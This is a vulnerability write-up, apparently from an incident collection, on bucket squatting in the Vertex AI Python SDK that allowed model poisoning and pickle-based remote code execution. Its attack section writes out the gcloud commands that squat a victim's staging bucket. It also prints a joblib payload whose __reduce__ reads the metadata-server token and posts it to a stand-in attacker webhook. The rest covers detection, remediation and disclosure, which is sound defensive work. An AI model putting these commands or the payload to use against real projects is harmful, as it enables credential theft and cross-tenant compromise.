# Pickle in the Middle — Vertex AI SDK Bucket Squatting Enables Zero-Access Cross-Tenant RCE via Model Poisoning

**Date:** June 2026
**Ecosystem:** Python / Google Cloud Vertex AI SDK
**Severity:** High (Google rated "Top Severity" internally)
**Type:** Bucket Squatting / ML Model Poisoning / Pickle Deserialization RCE / Supply Chain
**Sources:**
- [Unit 42 — Pickle in the Middle: Hijacking Vertex AI Model Uploads for Cross-Tenant RCE](https://unit42.paloaltonetworks.com/hijacking-vertex-ai-model/)

---

## Summary

Unit 42 researchers discovered a vulnerability in the Google Cloud Vertex AI SDK for Python (`google-cloud-aiplatform` v1.139.0 and v1.140.0) that allows an attacker with any Google Cloud account — requiring zero prior access to the victim's project — to intercept and poison a victim's ML model upload, achieving remote code execution inside the victim's Vertex AI serving infrastructure.

The root cause is a deterministic, predictable default staging bucket name. When a user uploads a model without specifying a custom `staging_bucket`, the SDK constructs a bucket name using the pattern `{project-id}-vertex-staging-{region}`. An attacker who knows the victim's project ID (often publicly discoverable) can preemptively register this bucket name in their own Google Cloud project — a technique called **bucket squatting**. Because Google Cloud's SDK checks only for bucket *existence* (not *ownership*), the victim's SDK silently uploads model artifacts into the attacker's bucket.

The attacker deploys a Google Cloud Function triggered on `google.storage.object.finalize` events. When the victim uploads a model, the function fires within ~800 ms and replaces the legitimate model file with a malicious `joblib`-serialised Python object whose `__reduce__` method executes arbitrary code on deserialisation. Because the race window between the victim's upload and Vertex AI's internal service agent read is approximately 2.5 seconds, the swap completes before the serving infrastructure ever touches the real model.

When the victim deploys the poisoned model to a Vertex AI endpoint, `joblib.load()` is called automatically, triggering the `__reduce__` payload with zero interaction. In Unit 42's proof-of-concept, this exfiltrated an OAuth access token belonging to Vertex AI's service agent in Google's managed tenant project — a service account with `cloud-platform` scope, the broadest possible Google Cloud authorisation — enabling cross-deployment model theft, BigQuery reconnaissance, and access to internal GKE infrastructure metadata.

The vulnerability was responsibly disclosed to Google and patched in `google-cloud-aiplatform` v1.148.0 (released April 15, 2026).

---

## Compromised Artifacts

| Artifact | Vulnerable Versions | Fixed Version |
|----------|-------------------|---------------|
| `google-cloud-aiplatform` (PyPI) | 1.139.0, 1.140.0 | ≥ 1.148.0 |

---

## How It Worked

### Prerequisite: Bucket Squatting (Phase 1)

The attacker creates the victim's predicted staging bucket in their own Google Cloud project before the victim ever uses Vertex AI in the target region. The deterministic naming formula is:

```
{PROJECT_ID}-vertex-staging-{REGION}
# e.g. my-company-project-vertex-staging-us-central1
```

The attacker configures the bucket's IAM policy to grant `allAuthenticatedUsers` `legacyBucketReader`, `objectCreator`, and `objectViewer` roles. The `legacyBucketReader` role is critical: it causes `bucket.exists()` to return `True` for any authenticated caller — so the victim's SDK sees the bucket, assumes it's theirs, and proceeds to write into it.

```bash
BUCKET="${VICTIM_PROJECT}-vertex-staging-${REGION}"
gcloud storage buckets create "gs://${BUCKET}" \
  --project="${ATTACKER_PROJECT}" --location="${REGION}" \
  --uniform-bucket-level-access

gcloud storage buckets add-iam-policy-binding "gs://${BUCKET}" \
  --member="allAuthenticatedUsers" --role="roles/storage.legacyBucketReader"
gcloud storage buckets add-iam-policy-binding "gs://${BUCKET}" \
  --member="allAuthenticatedUsers" --role="roles/storage.objectCreator"
gcloud storage buckets add-iam-policy-binding "gs://${BUCKET}" \
  --member="allAuthenticatedUsers" --role="roles/storage.objectViewer"
```

### Vulnerable SDK Code Path

The flaw is in `gcs_utils.py`, inside `stage_local_data_in_gcs()`:

```python
staging_bucket_name = project + "-vertex-staging-" + location  # deterministic
client = storage.Client(project=project, credentials=credentials)
staging_bucket = storage.Bucket(client=client, name=staging_bucket_name)
if not staging_bucket.exists():          # checks existence — NOT ownership
    staging_bucket = client.create_bucket(...)
staging_gcs_dir = "gs://" + staging_bucket_name
# → uploads model artifacts to attacker-controlled bucket
```

### Race Condition and Model Swapping (Phases 2–4)

The attacker deploys a Cloud Function triggered by `google.storage.object.finalize`. When it detects a new `model.joblib` file in a `vertex_ai_auto_staging` path it downloads the file and replaces it with a pre-generated malicious pickle payload. The measured timing from Unit 42's proof-of-concept:

| Timestamp | Event |
|-----------|-------|
| T + 0 ms | Victim SDK uploads `model.joblib` (601 bytes) |
| T + 804 ms | Cloud Function detects new object and fires |
| T + 1,433 ms | Cloud Function replaces file with RCE payload (2,945 bytes) |
| T + 2,460 ms | Vertex AI service agent (P4SA) reads the **replaced** model |

### Pickle Deserialization as RCE Vector (Phase 6)

The malicious payload is a `joblib`-serialised Python object with a crafted `__reduce__` method:

```python
class MaliciousModel:
    def __reduce__(self):
        # Executes on joblib.load() — before any type validation
        cmd = (
            "curl -s http://metadata.google.internal/computeMetadata/v1/instance/"
            "service-accounts/default/token -H 'Metadata-Flavor: Google' "
            "| curl -X POST https://attacker-webhook.example.com -d @-"
        )
        return (os.system, (cmd,))
```

When the victim's serving container calls `joblib.load()`, the payload fires immediately. In the proof-of-concept it exfiltrated an OAuth access token for the Vertex AI P4SA — `custom-online-prediction@<tenant-project>.iam.gserviceaccount.com` — with `cloud-platform` scope.

### Post-Exploitation Capabilities Demonstrated

With the exfiltrated P4SA token, Unit 42 confirmed the following cross-tenant capabilities:

- **Cross-deployment model theft**: Access to GCS buckets of other model deployments within the same Google-managed tenant project, including reading trained TensorFlow model weights
- **BigQuery reconnaissance**: Enumerate all datasets and table names in the victim's project; read dataset ACLs
- **Tenant infrastructure intelligence**: Read Cloud Logging from the managed tenant project, revealing GKE cluster names, active prediction deployments from other workloads, Google-internal container URIs, and Kubernetes system identities

---

## Timeline

| Date (UTC) | Event |
|-----------|-------|
| Mar 5, 2026 | Unit 42 reports vulnerability to Google Cloud via Vulnerability Reward Program (VRP) |
| Mar 9, 2026 | Google assigns top priority to the report |
| Mar 10, 2026 | Google acknowledges vulnerability, assigns top severity, escalates to product team |
| Mar 31, 2026 | Google deploys first fix to production |
| Apr 15, 2026 | Google deploys second fix; `google-cloud-aiplatform` v1.148.0 released |
| Jun 16, 2026 | Unit 42 publishes full disclosure article |

---

## Detection

```bash
# Check installed version of the Vertex AI SDK
pip show google-cloud-aiplatform | grep -E "^Version:"

# Programmatically check if the installed version is vulnerable
python3 -c "
import importlib.metadata
v = importlib.metadata.version('google-cloud-aiplatform')
parts = list(map(int, v.split('.')))
if parts[:3] in ([1,139,0], [1,140,0]):
    print(f'VULNERABLE version installed: {v} — upgrade to >=1.148.0 immediately')
elif parts[:3] < [1,148,0]:
    print(f'OLDER version {v} — verify whether bucket squatting affects your usage pattern')
else:
    print(f'OK: {v} is patched')
"

# List GCS buckets matching the vulnerable deterministic naming pattern
PROJECT=$(gcloud config get-value project)
gcloud storage buckets list --format='value(name)' | grep "${PROJECT}-vertex-staging-"

# Verify that your staging bucket is owned by YOUR project (not an attacker's)
# Replace REGION with your actual region (e.g., us-central1)
REGION=us-central1
BUCKET="${PROJECT}-vertex-staging-${REGION}"
echo "Checking ownership of gs://${BUCKET}..."
gsutil iam get "gs://${BUCKET}" 2>/dev/null | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
except:
    print('Could not read bucket IAM — bucket may not exist or access denied')
    sys.exit(0)
for b in data.get('bindings', []):
    if 'allAuthenticatedUsers' in b.get('members', []):
        print('WARNING: allAuthenticatedUsers granted role:', b['role'])
        print('This bucket may be attacker-controlled!')
"

# Check Vertex AI audit logs for unexpected model upload origins (requires Cloud Logging)
gcloud logging read \
  'resource.type="aiplatform.googleapis.com/Model" AND protoPayload.methodName="google.cloud.aiplatform.v1.ModelService.UploadModel"' \
  --format='table(timestamp,protoPayload.authenticationInfo.principalEmail,protoPayload.request.model.displayName)' \
  --limit=50

# Search for the deterministic bucket name in SDK source (to verify patch is applied)
python3 -c "
import google.cloud.aiplatform as aip, inspect, pathlib
src = pathlib.Path(inspect.getfile(aip)).parent
gcs_utils = src / 'utils' / 'gcs_utils.py'
if gcs_utils.exists():
    content = gcs_utils.read_text()
    if 'uuid' in content.lower() or 'random' in content.lower():
        print('PATCHED: bucket naming includes randomness')
    elif 'vertex-staging' in content:
        print('WARNING: deterministic bucket name still present — verify version')
"
```

---

## Remediation

1. **Upgrade immediately**: Install `google-cloud-aiplatform >= 1.148.0` in all environments using Vertex AI model uploads
   ```bash
   pip install "google-cloud-aiplatform>=1.148.0"
   ```
2. **Always specify a staging bucket explicitly**: Pass `staging_bucket="gs://your-controlled-bucket"` to `Model.upload()` — this bypasses the deterministic naming entirely
3. **Audit existing staging buckets**: Verify that any bucket matching `{PROJECT}-vertex-staging-{REGION}` is owned by your project, not an unexpected one
4. **Revoke and rotate credentials if affected**: If you ran a vulnerable SDK version with the default naming, assume your Vertex AI P4SA token may have been captured — contact Google Cloud support and rotate service account keys
5. **Enable Vertex AI audit logging**: Ensure Cloud Audit Logs are enabled for `aiplatform.googleapis.com` to detect unexpected model upload events and origins
6. **Apply least-privilege to staging buckets**: Staging buckets should not be publicly readable; restrict access to your project's service accounts only

---

## Lessons Learned

- **Deterministic cloud resource names are a supply chain attack surface**: Any SDK or platform that constructs resource names (buckets, queues, topics) from predictable inputs like project IDs and regions is potentially vulnerable to squatting attacks — ownership verification must accompany existence checks.
- **The ML model lifecycle is an under-scrutinised supply chain vector**: While package registries (npm, PyPI) receive significant security attention, ML model artefacts travel through cloud storage buckets with far less visibility, integrity checking, or signing.
- **Pickle deserialisation remains a critical risk in ML pipelines**: Python's `pickle` and `joblib` are widely used to serialise ML models, but they execute arbitrary code on load with no sandboxing. The industry needs cryptographic model signing comparable to Sigstore for packages.
- **Managed service infrastructure bridges tenant trust boundaries**: The Vertex AI P4SA operates across multiple tenant projects, meaning a single credential exfiltration grants reach far beyond the immediately compromised deployment.
- **Race condition windows of 2.5 seconds are exploitable**: Cloud-based event triggers (Cloud Functions, Lambda, EventBridge) can react in under one second, making race conditions in cloud storage workflows practically exploitable by well-resourced attackers.

---

## Related Incidents

- [2026-06-hades-campaign-pypi.md](./2026-06-hades-campaign-pypi.md) — Malicious PyPI packages targeting ML/AI ecosystems; similar theme of attacking ML developer infrastructure
- [2026-04-lightning-pypi-shai-hulud.md](./2026-04-lightning-pypi-shai-hulud.md) — PyTorch Lightning PyPI compromise targeting GPU cluster credentials and HuggingFace tokens
- [2026-05-jinx-0164-crypto-supply-chain.md](./2026-05-jinx-0164-crypto-supply-chain.md) — Supply chain attack using CI/CD secret exfiltration for lateral movement
